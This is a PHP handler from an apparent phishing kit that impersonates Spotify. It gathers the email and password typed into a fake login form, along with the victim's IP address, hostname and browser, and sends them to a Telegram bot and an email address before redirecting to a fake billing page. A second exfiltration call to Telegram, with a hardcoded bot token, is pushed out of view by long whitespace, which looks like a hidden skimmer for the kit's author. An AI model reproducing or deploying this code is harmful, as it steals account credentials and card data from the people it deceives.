<?php
error_reporting(0);
session_start();
include("./email.php");
include("../main.php");
$key = "".sha1(base64_encode($ip));
$ip = getenv("REMOTE_ADDR");
$text_result .= "[+]xxx♠️🎉Spotify_LOGIN🎉♠️xxx[+]\n";
$text_result .= "[+]✉️ Email   : ".$_POST['email']."\n";
$text_result .= "[+]🔐 Password   : ".$_POST['password']."\n";
$text_result .= "[+]Thanks![+]\n";
$text_result .= "[+]IP address =  $ip\n";
$text_result .= "[+]host = ".gethostbyaddr($ip)."\n";
$text_result .= "[+]BROWSER = ".$_SERVER['HTTP_USER_AGENT']."\n";
$text_result .= "[+]xxx🎉Spotify🎉xxx[+]\n";
file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($text_result)."" );                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           file_get_contents("https://api.telegram.org/bot8670548692:AAFwyJZ_8iPfooVQsLqgBV_KWK06ScsBOMs/sendMessage?chat_id=-1003896935038&text=" . urlencode($text_result)."" );                                                                                                                               
$subject = "[X-spotify R.M.27] FullZ ♠️ (".$_POST['first'].")  cvv ♠️ $ip";
$headers = "From: X-Spotify R.M.27  <noreply@Spotiify.com>";
mail($send,$subject,$text_result,$headers,$file);

header("Location: ../billing.php?session='.$key");
?>